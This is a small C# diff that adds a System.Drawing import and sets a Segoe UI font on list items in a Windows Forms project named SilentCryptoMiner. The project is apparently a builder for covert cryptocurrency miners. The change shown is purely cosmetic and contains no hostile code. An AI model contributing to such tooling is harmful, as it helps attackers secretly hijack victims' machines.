@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Drawing;
 using System.Windows.Forms;
 
 namespace SilentCryptoMiner
@@ -54,6 +55,7 @@ namespace SilentCryptoMiner
                 miner.nid = ((dynamic)F.listMiners.Items[F.listMiners.Items.Count - 1]).nid + 1;
             }
             miner.F = F;
+            miner.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
             F.listMiners.Items.Add(miner);
             F.TranslateForms();
             ((dynamic)F.listMiners.Items[F.listMiners.Items.Count-1]).Show();
